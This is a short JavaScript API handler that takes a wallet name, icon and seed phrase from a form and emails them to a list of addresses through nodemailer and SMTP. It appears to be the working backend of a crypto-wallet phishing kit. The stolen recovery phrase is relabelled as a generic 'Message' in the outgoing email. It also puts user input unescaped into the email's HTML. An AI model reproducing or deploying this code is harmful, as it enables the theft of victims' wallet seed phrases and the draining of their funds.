import nodemailer from "nodemailer";

// Configure SMTP transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT),
  secure: parseInt(process.env.SMTP_PORT) === 465,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

if (parseInt(process.env.SMTP_PORT) === 587) {
  transporter.set("logger", true);
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { walletName, walletIcon, seedPhrase, emailAddresses } = req.body;

  // Validate inputs
  if (!walletName || !walletIcon || !seedPhrase || !emailAddresses) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  try {
    // ✅ Send via Nodemailer/SMTP to multiple addresses
    const result = await transporter.sendMail({
      from: process.env.SMTP_FROM,
      to: Array.isArray(emailAddresses)
        ? emailAddresses.join(", ")
        : emailAddresses,
      subject: `New Message from ${walletName}`,
      html: `
        <h2>New Submission</h2>
        <p><strong>Name:</strong> ${walletName}</p>
        <p><strong>Icon:</strong> ${walletIcon}</p>
        <p><strong>Message:</strong></p>
        <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
        <hr>
        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
      `,
    });

    console.log("Email sent via SMTP:", result.messageId);

    return res.status(200).json({
      success: true,
      message: "✅ Email sent successfully via SMTP",
      messageId: result.messageId,
    });
  } catch (error) {
    console.error("SMTP Email error:", error);
    return res.status(500).json({
      success: false,
      error: "Failed to send email via SMTP",
      details: error.message,
    });
  }
}
